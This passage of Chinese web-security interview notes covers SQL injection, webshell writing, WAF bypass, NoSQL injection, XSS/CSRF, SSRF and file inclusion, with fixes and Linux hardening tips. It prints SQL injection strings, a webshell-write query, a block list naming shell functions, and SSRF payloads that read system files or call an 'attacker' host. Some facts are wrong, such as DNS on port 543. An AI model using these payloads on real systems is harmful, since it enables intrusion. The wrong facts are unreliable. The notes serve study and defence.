user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;  </code></li></ul></li></ol><h4 id="MySQL存储过程">MySQL存储过程</h4><h4 id="各种写shell的问题">各种写shell的问题</h4><ol><li>写shell用什么函数？<ul><li><code>select '&lt;?php phpinfo()&gt; into outfile 'D:/shelltest.php'</code></li><li><code>dumpfile</code></li><li><code>file_put_contents</code></li></ul></li><li>outfile不能用了怎么办？ <code>select unhex('udf.dll hex code') into dumpfile 'c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll';</code>可以UDF提权 <a href="https://www.cnblogs.com/milantgh/p/5444398.html" target="_blank" rel="noopener">https://www.cnblogs.com/milantgh/p/5444398.html</a></li><li>dumpfile和outfile有什么不一样？outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。</li><li>sleep()能不能写shell？</li><li>写shell的条件？<ul><li>用户权限</li><li>目录读写权限</li><li>防止命令执行：<code>disable_functions</code>，禁止了<code>disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</code>，但是可以用dl扩展执行命令或者ImageMagick漏洞 <a href="https://www.waitalone.cn/imagemagic-bypass-disable_function.html" target="_blank" rel="noopener">https://www.waitalone.cn/imagemagic-bypass-disable_function.html</a></li><li>open_basedir: 将用户可操作的文件限制在某目录下</li></ul></li></ol><h4 id></h4><h3 id="注入类型">注入类型</h3><ol><li>基于报错注入</li><li>基于布尔的注入，根据返回页面判断条件真假的注入</li><li>基于时间的盲注，不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li><li>宽字节注入</li><li>联合查询，可以使用 union 的情况下的注入。</li><li>堆查询注入，可以同时执行多条语句的执行时的注入。</li></ol><h3 id="SQL注入的原理">SQL注入的原理</h3><p>通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。通常未经检查或者未经充分检查的用户输入数据或代码编写问题，意外变成了代码被执行。</p><h3 id="过waf">过waf</h3><blockquote><p><a href="https://blog.csdn.net/wjy397/article/details/53263281" target="_blank" rel="noopener">https://blog.csdn.net/wjy397/article/details/53263281</a></p></blockquote><ol><li>确定waf类型，狗、盾、神、锁、宝、卫士</li><li>使用注释符号或者特殊符号或者多个特殊符号重复</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">--</span><br><span class="line">-- - //5.6.12特性，需要加空格</span><br><span class="line">--+</span><br><span class="line">//</span><br><span class="line">/**/ //c风格注释</span><br><span class="line">/**//**/  //多个注释</span><br><span class="line">/*letmetest*/</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 科学记数法</span><br><span class="line">id=0e1union select</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 空白字符</span><br><span class="line">SQLite3 0A 0D 0C 09 20</span><br><span class="line">MySQL5 09 0A 0B 0C 0D A0 20</span><br><span class="line">PosgresSQL 0A 0D 0C 09 20</span><br><span class="line">Oracle 11g 00 0A 0D 0C 09 20</span><br><span class="line">MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20</span><br></pre></td></tr></table></figure><ol start="3"><li>使用sql内置函数或者关键字</li></ol><blockquote><p>报错注入 <a href="https://blog.csdn.net/like98k/article/details/79646512" target="_blank" rel="noopener">https://blog.csdn.net/like98k/article/details/79646512</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 常用</span><br><span class="line">extractvalue</span><br><span class="line">updatexml 报错注入</span><br><span class="line">UPDATEXML (XML_document, XPath_string, new_value);</span><br><span class="line">or updatexml(1, concat(0x7e, (version()), 0x7e), 0);</span><br><span class="line">&gt; select * from  users where id = 1 and updatexml(1, concat(0x7e, (version()), 0x7e), 0);</span><br><span class="line">&gt; version() database() (SELECT concat(column_name) FROM information_schema.columns WHERE table_name=&apos;users&apos; limit 0,1</span><br><span class="line"></span><br><span class="line">floor()</span><br><span class="line">ceil()</span><br><span class="line">Mid(version(),1,1)</span><br><span class="line">Substr(version(),1,1)</span><br><span class="line">Substring(version(),1,1)</span><br><span class="line">concat(version(),&apos;|&apos;,user());</span><br><span class="line">concat_ws(&apos;|&apos;,1,2,3)</span><br><span class="line">Char(49)</span><br><span class="line">Hex(&apos;a&apos;)</span><br><span class="line">Unhex(61)</span><br><span class="line">过滤了逗号</span><br><span class="line">(1)limit处的逗号：</span><br><span class="line">limit 1 offset 0</span><br><span class="line">(2)字符串截取处的逗号</span><br><span class="line">mid处的逗号：</span><br><span class="line">mid(version() from 1 for 1)</span><br></pre></td></tr></table></figure><ol start="4"><li>利用容器特性，比如iis+asp的环境可能会吞掉%(f%rom-&gt;from)造成注入，或者iis支持unicode解析，当我们请求的url存在unicode字符串的话iis会自动将其转换，但waf可能不会拦截造成注入</li><li>畸形协议/请求。asp/asp.net在解析请求的时候，允许application/x-www-form-urlencoded的数据提交方式;php+apache解析协议除了get/post外随便定义协议也可能过</li><li>%0a换行</li><li>多次URL编码，waf的一根筋过滤</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unlencode</span><br><span class="line">base64</span><br><span class="line">json</span><br><span class="line">binary</span><br><span class="line">querystring</span><br><span class="line">htmlencode</span><br><span class="line">unicode</span><br><span class="line">php serialize</span><br></pre></td></tr></table></figure><ol start="8"><li>http参数污染，<code>id=1&amp;id=2&amp;id=3</code> <code>id=1,2,3</code></li></ol><h3 id="如何进行SQL注入的防御">如何进行SQL注入的防御</h3><ol><li><p>关闭应用的错误提示</p></li><li><p>加waf</p></li><li><p>对输入进行过滤</p></li><li><p>限制输入长度</p></li><li><p>限制好数据库权限，drop/create/truncate等权限谨慎grant</p></li><li><p>预编译好sql语句，python和Php中一般使用?作为占位符。这种方法是从编程框架方面解决利用占位符参数的sql注入，只能说一定程度上防止注入。还有缓存溢出、终止字符等。</p></li><li><p>数据库信息加密安全（引导到密码学方面）。不采用md5因为有彩虹表，一般是一次md5后加盐再md5</p></li><li><p>清晰的编程规范，结对/自动化代码 review ，加大量现成的解决方案（PreparedStatement，ActiveRecord，歧义字符过滤， 只可访问存储过程 balabala）已经让 SQL 注入的风险变得非常低了。</p></li><li><p>具体的语言如何进行防注入，采用什么安全框架</p></li></ol><blockquote><p>作者：没啥意思<br>链接：<a href="https://www.zhihu.com/question/22953267/answer/23222069" target="_blank" rel="noopener">https://www.zhihu.com/question/22953267/answer/23222069</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p></blockquote><blockquote><p>SQL注入问题既不能“靠用户（开发者也是用户）的自觉去避免”，也不能完全脱离用户（开发者也是用户）而指望数据库层面去避免。对于那些不了解SQL注入漏洞细节或不关心SQL注入漏洞或没精力去关心SQL注入漏洞的工程师，你要给他们一条尽可能简单可行透明的方案来避免SQL注入漏洞，告诉他这样写就可以了，这就是安全框架；然后告诉他或者让他的老大告诉他你必须这样写，这就是安全编码规范；然后你有手段在他没有这样写的时候能够检查出来（这比检查出漏洞要容易）并推动他改正，这就是白盒检查。</p></blockquote><blockquote><p>我们现在的互联网产品SQL注入漏洞仍然层出不穷，并不是这套思路有问题，相反恰恰是这套思路没有完善。一方面是框架方案本身不完善，以SQL注入漏洞为例，参数化是防SQL注入框架级方案的重要部分，但仅靠参数化没法很好满足开发过程中一些常见需求，如逗号分割的id列表问题、排序标记的问题等等（其实这些问题真要用参数化的方案解决也可以），使得开发更愿意在这些地方使用非参数化或伪参数化的方法（比如拼接SQL片段后再把整个片段当作参数扔进去exec）。这些问题在参数化的基础上，再加以改进，仍然守着拼接SQL片段时进行强类型转换的思路，仍然是能很好解决的，也就是继续完善参数化方案的问题，而不是看上去那样“参数化解决不了问题”。另一方面，安全编码规范的制定、培训、流程建设和实施保证上也做得远远不到位，开发leader们更希望后面的数据库或者前面的安全防御上能有手段去解决SQL注入问题，对于安全工程师来说，设置并维护几个特征串、语法分析场景也远比做那些安全框架、编码规范、白盒扫描来得要轻松实在，彼此在心照不宣中度过今天，自然不能指望明天能彻底踏实。</p></blockquote><h3 id="mysql的网站注入，5-0以上和5-0以下有什么区别？">mysql的网站注入，5.0以上和5.0以下有什么区别？</h3><p>10年前就出了5.0，现在都到5.7了，没啥意义的问题</p><ul><li>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</li><li>5.0以下是多用户单操作，5.0以上是多用户多操做。</li></ul><h3 id="SQL和NoSQL的区别">SQL和NoSQL的区别</h3><p>SQL关系型数据库，NoSQL(Not only SQL)非关系型数据库</p><h4 id="SQL优点">SQL优点</h4><p>关系型数据库是指用关系数学模型来表示的数据，其中是以二维表的形式描述数据。</p><ol><li>结构稳定，不易修改，常用联表查询</li><li>查询能力高，可以操作很复杂的查询</li><li>一致性高，处理数据会使用封锁保证数据不被改变</li><li>表具有逻辑性，易于理解</li></ol><h4 id="SQL缺点">SQL缺点</h4><ol><li>不适用高并发读写</li><li>不适用海量数据高效读写</li><li>层次多，扩展性低</li><li>维护一致性开销大</li><li>涉及联表查询，复杂，慢</li></ol><h4 id="NoSQL优点">NoSQL优点</h4><p>采用键值对存储数据</p><ol><li>由于数据之间没有关系，所以易扩展，也易于查询</li><li>数据结构灵活，每个数据都可以有不同的结构</li><li>由于降低了一致性的要求，所以查询速度更快</li></ol><h4 id="比较">比较</h4><p>非关系型数据库的产生是因为随着网站的进化，并发性增加，扩展性高，一致性要求降低。这样关系型数据库最重要的一致性维护就显得有点多余，并且消耗着性能。因此有了非关系型数据库，它可以算是关系型数据库的一种弱化的结果，在海量数据存储和查询上更胜一筹。</p><p>两种数据库没有好坏之分，只是使用的环境不一样。关系型数据库可以说是更严谨的，可靠性更强的数据库，在对于数据精度要求高的环境，比如说银行系统这样自然是像mysql这样的数据库适合。非关系型数据库胜在处理大数据的速度，但是对于数据的准确度没有那么高，对于操作量大的环境比如当前大部分web2.0的网站更加适用一些。</p><h4 id="MongoDB注入方式">MongoDB注入方式</h4><p>利用正则：找到y开头的name   <code>db.items.find({name: {$regex: &quot;^y&quot;}})</code></p><p>一些payload</p><ol><li><code>?login[$regex]=^&amp;password[$regex]=^</code></li><li><code>?login[$not][$type]=1&amp;password[$not][$type]=1</code></li></ol><h2 id="XSS-CSRF-XXE">XSS CSRF XXE</h2><h3 id="CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？">CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h3><blockquote><p>xss学习 <a href="https://www.secpulse.com/?s=+%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS+" target="_blank" rel="noopener">https://www.secpulse.com/?s=+那些年我们一起学XSS+</a></p></blockquote><p>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</p><p>CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer.</p><p>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p><h3 id="CSRF、SSRF和重放攻击有什么区别？">CSRF、SSRF和重放攻击有什么区别？</h3><ul><li>CSRF是跨站请求伪造攻击，由客户端发起</li><li>SSRF是服务器端请求伪造，由服务器发起</li><li>重放攻击是将截获的数据包进行重放，达到身份认证等目的</li></ul><h3 id="啥是同源策略，跨域有几种方式？">啥是同源策略，跨域有几种方式？</h3><blockquote><p><a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html</a></p></blockquote><p>浏览器安全的基石是&quot;同源政策&quot;，目的是为了保证用户的信息安全，防止恶意网站窃取数据，避免cookie共享。同源含义是协议、域名、端口相同的两个网页才可以共用cookie。目前如果非同源，有三种行为收到限制：<br>- Cookie、LocalStorage 和 IndexDB 无法读取。<br>- DOM 无法获得。<br>- AJAX 请求不能发送</p><h3 id="如何规避同源策略？">如何规避同源策略？</h3><h4 id="JSONP">JSONP</h4><p>向服务器请求json数据回调，一般请求URL会加上<code>&amp;callback=xx</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foo(&#123;</span><br><span class="line">  <span class="string">"ip"</span>: <span class="string">"8.8.8.8"</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>由于<code>&lt;script&gt;</code>元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了foo函数，该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用JSON.parse的步骤。</p><h5 id="JSONP的劫持">JSONP的劫持</h5><blockquote><p><a href="http://blog.knownsec.com/2015/03/jsonp_security_technic/" target="_blank" rel="noopener">http://blog.knownsec.com/2015/03/jsonp_security_technic/</a></p></blockquote><p>防御：</p><ol><li>验证 JSON 文件调用的来源（ Referer ），但是Referer 过滤（正则）不严谨、空 Referer也不行</li><li>随机token</li><li></li></ol><h4 id="WebSocket">WebSocket</h4><p>WebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。</p><h4 id="CORS-重点">CORS(重点)</h4><blockquote><p><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/04/cors.html</a></p></blockquote><p>CORS是跨源资源分享（Cross-Origin Resource Sharing）的缩写。它是W3C标准，是跨源AJAX请求的根本解决方法。相比JSONP只能发GET请求，CORS允许任何类型的请求。<br>CORS请求大致和ajax请求，但是在头信息中加上了Origin字段表明请求来自哪个源。如果orgin是许可范围之内的话，服务器返回的响应会多出<code>Acess-Control-Allow-*</code>的字段</p><h5 id="与JSONP的比较">与JSONP的比较</h5><p>CORS与JSONP的使用目的相同，但是比JSONP更强大。</p><p>JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p><h3 id="DOM-XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM-XSS？">DOM XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM XSS？</h3><blockquote><p><a href="https://www.zhihu.com/question/26628342" target="_blank" rel="noopener">https://www.zhihu.com/question/26628342</a></p></blockquote><p>存储型XSS：你发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码；</p><p>反射型XSS：你发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码；</p><p>DOM型XSS：你发送一次带XSS代码的请求，在返回包里压根儿就找不到XSS代码的影子；</p><h3 id="CSP策略">CSP策略</h3><blockquote><p><a href="https://www.zhihu.com/question/21979782" target="_blank" rel="noopener">https://www.zhihu.com/question/21979782</a><br>浏览器内容安全策略，减少xss攻击。</p></blockquote><h3 id="SSRF漏洞原理是什么？利用时有哪些伪协议？">SSRF漏洞原理是什么？利用时有哪些伪协议？</h3><blockquote><p><a href="http://secpulse.com/archives/65832.html" target="_blank" rel="noopener">secpulse.com/archives/65832.html</a></p></blockquote><h4 id="漏洞原理">漏洞原理</h4><p>利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。</p><h4 id="ssrf用处">ssrf用处</h4><ol><li>探测内网信息,用协议探<code>ftp%26ip={ip}%26port={port}</code></li><li>攻击内网或本地其他服务</li><li>穿透防火墙</li></ol><h4 id="漏洞处">漏洞处</h4><ol><li>能够对外发起网络请求的地方</li><li>请求远程服务器资源的地方</li><li>数据库内置功能</li><li>邮件系统</li><li>文件处理</li><li>在线处理工具</li></ol><p>举几个例子：</p><ol><li>在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。</li><li>根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。</li><li>数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。</li><li>邮件系统就是接收邮件服务器地址这些地方。</li><li>文件就找ImageMagick，xml这些。</li><li>从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。</li></ol><h4 id="绕过姿势">绕过姿势</h4><ol><li><code>http://example.com@127.0.0.1</code></li><li>利用IP地址的省略写法绕过,[::]绕过localhost</li><li>DNS解析 <a href="http://127.0.0.1.xip.io/" target="_blank" rel="noopener">http://127.0.0.1.xip.io/</a>  可以指向任意ip的域名：<a href="http://xip.io" target="_blank" rel="noopener">xip.io</a></li><li>利用八进制IP地址绕过,利用十六进制IP地址,绕过利用十进制的IP地址绕过</li></ol><h4 id="利用协议">利用协议</h4><blockquote><p><a href="https://www.secpulse.com/archives/70471.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/70471.html</a></p></blockquote><p>接受ua为curl的时候，支持的协议有<br><img src="https://www.secpulse.com/wp-content/uploads/2018/04/15235056451.png" alt></p><p>使用<code>curl -v http://xx.com/ssrf.php?url=sxxx</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file://</span><br><span class="line">ssrf.php?url=file:///etc/password</span><br><span class="line">Dict://</span><br><span class="line">dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</span><br><span class="line">ssrf.php?url=dict://attacker:11111/</span><br><span class="line">SFTP://</span><br><span class="line">ssrf.php?url=sftp://example.com:11111/</span><br><span class="line">TFTP://</span><br><span class="line">ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET</span><br><span class="line">LDAP://</span><br><span class="line">ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</span><br><span class="line">Gopher://</span><br></pre></td></tr></table></figure><h4 id="漏洞修复">漏洞修复</h4><blockquote><p><a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html</a></p></blockquote><ol><li><p>检查是否为内网IP地址<br>绕过方法:<br>利用八进制IP地址绕过<br>利用十六进制IP地址绕过<br>利用十进制的IP地址绕过<br>利用IP地址的省略写法绕过<br>最好的做法：IP地址转换为整数再进行判断</p></li><li><p>获取真正请求的host</p><ol><li><p>如何正确的获取用户输入的URL的Host？<br>最常见的就是，使用http://233.233.233.233@10.0.0.1:8080/、<a href="http://10.0.0.1#233.233.233.233%E8%BF%99%E6%A0%B7%E7%9A%84URL%EF%BC%8C%E8%AE%A9%E5%90%8E%E7%AB%AF%E8%AE%A4%E4%B8%BA%E5%85%B6Host%E6%98%AF233.233.233.233%EF%BC%8C%E5%AE%9E%E9%99%85%E4%B8%8A%E8%AF%B7%E6%B1%82%E7%9A%84%E5%8D%B4%E6%98%AF10.0.0.1%E3%80%82%E8%BF%99%E7%A7%8D%E6%96%B9%E6%B3%95%E5%88%A9%E7%94%A8%E7%9A%84%E6%98%AF%E7%A8%8B%E5%BA%8F%E5%91%98%E5%AF%B9URL%E8%A7%A3%E6%9E%90%E7%9A%84%E9%94%99%E8%AF%AF%EF%BC%8C%E6%9C%89%E5%BE%88%E5%A4%9A%E7%A8%8B%E5%BA%8F%E5%91%98%E7%94%9A%E8%87%B3%E4%BC%9A%E7%94%A8%E6%AD%A3%E5%88%99%E5%8E%BB%E8%A7%A3%E6%9E%90URL%E3%80%82%E4%BD%BF%E7%94%A8urllib.parse%E5%8F%AF%E4%BB%A5%E8%A7%A3%E6%9E%90%E7%9C%9F%E6%AD%A3%E7%9A%84hostname" target="_blank" rel="noopener">http://10.0.0.1#233.233.233.233这样的URL，让后端认为其Host是233.233.233.233，实际上请求的却是10.0.0.1。这种方法利用的是程序员对URL解析的错误，有很多程序员甚至会用正则去解析URL。使用urllib.parse可以解析真正的hostname</a></p></li><li><p>只要Host只要不是内网IP即可吗？<br>host可能为ip,可能为域名，利用xip.io绕过。方法：判断是否为http协议，获取url的host，再解析该host，将解析到的ip再进行检查</p></li><li><p>只要Host指向的IP不是内网IP即可吗？<br>不一定，可能会30x跳转</p></li></ol></li></ol><p>归纳<br>解析目标URL，获取其Host<br>解析Host，获取Host指向的IP地址<br>检查IP地址是否为内网IP<br>请求URL<br>如果有跳转，拿出跳转URL，执行1</p><h3 id="在浏览器端，Referer可以篡改吗？">在浏览器端，Referer可以篡改吗？</h3><p>通过插件修改，一般抓包修改</p><h3 id="xss盲打到内网服务器的利用">xss盲打到内网服务器的利用</h3><h3 id="xss代码层防御">xss代码层防御</h3><h2 id="文件上传下载遍历漏洞">文件上传下载遍历漏洞</h2><h3 id="原理">原理</h3><ol><li>容器漏洞，解析漏洞</li></ol><h3 id="修复方案">修复方案</h3><h2 id="文件包含漏洞">文件包含漏洞</h2><blockquote><p><a href="https://blog.csdn.net/fuckcat_2333/article/details/52132559" target="_blank" rel="noopener">https://blog.csdn.net/fuckcat_2333/article/details/52132559</a></p></blockquote><h3 id="类型">类型</h3><ol><li>本地文件包含</li><li>远程文件包含 ：即加载远程文件，在<code>php.ini</code>中开启<code>allow_url_include</code>、<code>allow_url_fopen</code>选项。开启后可以直接执行任意代码。</li></ol><h3 id="PHP文件包含函数">PHP文件包含函数</h3><ol><li><p><code>include()</code> ：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</p></li><li><p><code> inclue_once()</code> ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p></li><li><p><code>require()</code>：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</p></li><li><p><code> require_once()</code> ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p></li></ol><h3 id="利用">利用</h3><ol><li>读取敏感文件</li><li>远程包含shell</li><li>图片上传并包含图片shenll</li><li>使用伪协议</li><li>包含日志文件GetShell</li><li>截断包含</li></ol><h3 id="修复方案-2">修复方案</h3><ol><li>禁止远程文件包含 <code>allow_url_include=off</code></li><li>配置 <code>open_basedir=指定目录</code>，限制访问区域。</li><li>过滤<code>../</code>等特殊符号</li><li>修改Apache日志文件的存放地址</li><li>开启魔术引号 <code>magic_quotes_qpc=on</code></li><li>尽量不要使用动态变量调用文件，直接写要包含的文件。</li></ol><h2 id="web框架漏洞弱点">web框架漏洞弱点</h2><h3 id="服务端注入之Flask框架中服务端模板注入问题">服务端注入之Flask框架中服务端模板注入问题</h3><blockquote><p><a href="http://www.freebuf.com/articles/web/135953.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/135953.html</a></p></blockquote><h2 id="HTTP协议">HTTP协议</h2><h3 id="TCP三次握手四次挥手">TCP三次握手四次挥手</h3><h4 id="三次握手">三次握手</h4><ol><li>客户端 syn 发送到服务端，变成 SYN_SENT 状态</li><li>服务端 ack=syn+1 回传syn到客户端，变成SYN_RECV状态</li><li>客户端 ack=syn+1， 变成ESTABLISHED状态，传输给服务端</li><li>服务端收到ACK后变成ESTABLISHED状态，建立连接</li></ol><p>SYN标志位为表示请求连接，ACK表示确认</p><h4 id="四次挥手">四次挥手</h4><p>客户端=主动关闭方</p><ol><li>客户端FIN-&gt;服务端</li><li>服务端ACK=FIN+1-&gt;客户端，服务端到客户端的连接关闭</li><li>服务端FIN-&gt;客户端</li><li>客户端ACK=FIN+1-&gt;服务端</li></ol><p>假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说&quot;我Client端没有数据要发给你了&quot;，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，“告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，“告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，&quot;就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，“就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p><blockquote><p>MSL=最大段寿命=TTL=最大生存时间=255s</p></blockquote><h3 id="四层模型">四层模型</h3><ol><li>应用层<br>应用层对应于OSI参考模型的高层，为用户提供所需要的各种服务，例如：FTP、Telnet、DNS、SMTP等.</li><li>传输层<br>传输层对应于OSI参考模型的传输层，为应用层实体提供端到端的通信功能，保证了数据包的顺序传送及数据的完整性。该层定义了两个主要的协议：传输控制协议（TCP）和用户数据报协议（UDP).<br>TCP协议提供的是一种可靠的、通过“三次握手”来连接的数据传输服务；而UDP协议提供的则是不保证可靠的（并不是不可靠）、无连接的数据传输服务.</li><li>网际互联层<br>网际互联层对应于OSI参考模型的网络层，主要解决主机到主机的通信问题。它所包含的协议设计数据包在整个网络上的逻辑传输。注重重新赋予主机一个IP地址来完成对主机的寻址，它还负责数据包在多种网络中的路由。该层有三个主要协议：网际协议（IP）、互联网组管理协议（IGMP）和互联网控制报文协议（ICMP）。<br>IP协议是网际互联层最重要的协议，它提供的是一个可靠、无连接的数据报传递服务。</li><li>网络接入层（即主机-网络层）<br>网络接入层与OSI参考模型中的物理层和数据链路层相对应。它负责监视数据在主机和网络之间的交换。事实上，TCP/IP本身并未定义该层的协议，而由参与互连的各网络使用自己的物理层和数据链路层协议，然后与TCP/IP的网络接入层进行连接。地址解析协议（ARP）工作在此层，即OSI参考模型的数据链路层。</li></ol><h3 id="当你输入一个网址，点击访问，会发生什么？">当你输入一个网址，点击访问，会发生什么？</h3><h4 id="查找DNS记录">查找DNS记录</h4><ol><li>查看浏览器缓存</li><li>查看系统缓存</li><li>查看路由器缓存</li><li>查找ISP DNS缓存</li><li>递归搜索。根据网址，发送一个DNS请求，UDP请求，端口为543，会请求一个DNS服务器，DNS服务器会不断递归查找这个网址的IP</li></ol><h4 id="建立连接">建立连接</h4><ol start="2"><li>跟获取到的IP建立TCP连接，在TCP连接上发送HTTP报文</li><li></li></ol><h3 id="常见的状态码">常见的状态码</h3><h3 id="OSI七层">OSI七层</h3><p>物理层、数据链路层、网络层、传输层(TCP，UDP)、会话层(RPC，SQL)、表示层(定义数据格式及加密)、应用层(TELNET，HTTP，FTP)</p><h4 id="OSI四层">OSI四层</h4><h2 id="路由协议">路由协议</h2><h3 id="你搭建过的最复杂的网络设备是什么">你搭建过的最复杂的网络设备是什么</h3><h3 id="使用过什么硬件设备">使用过什么硬件设备</h3><h2 id="Linux运维">Linux运维</h2><h3 id="启动过程">启动过程</h3><h3 id="Linux基线规范">Linux基线规范</h3><p>每个公司有每个公司的基线规范体系，但是答题分为下列五个方面</p><h4 id="账号管理和授权">账号管理和授权</h4><ul><li>检查特殊账号，是否存在空密码的账户和root权限账户</li><li>禁用或删除无用账号</li><li>添加口令策略:<code>/etc/login.defs</code>修改配置文件，设置过期时间、连续认证失败次数</li><li>禁止root远程登录，限制root用户直接登录。</li><li>检查su权限。<code>vi /etc/pam.d/su</code>添加<code>auth required pam_wheel.so group=test</code></li></ul><h4 id="服务">服务</h4><ul><li>关闭不必要的服务</li><li>SSH服务安全<ul><li>不允许root账号直接登录系统，<code>PermitRootLogin=no</code></li><li>修改SSH使用的协议版本为2</li><li>修改允许密码错误次数（默认6次），<code>MaxAuthTries=3</code></li></ul></li></ul><h4 id="文件系统">文件系统</h4><ul><li>设置umask值 <code>vi /etc/profile</code> 添加行 <code>umask 027</code></li><li>设置登录超时 <code>vi /etc/profile</code> 修改配置文件，将以 <code>TMOUT=</code> 开头的行注释，设置为 <code>TMOUT=180</code></li></ul><h4 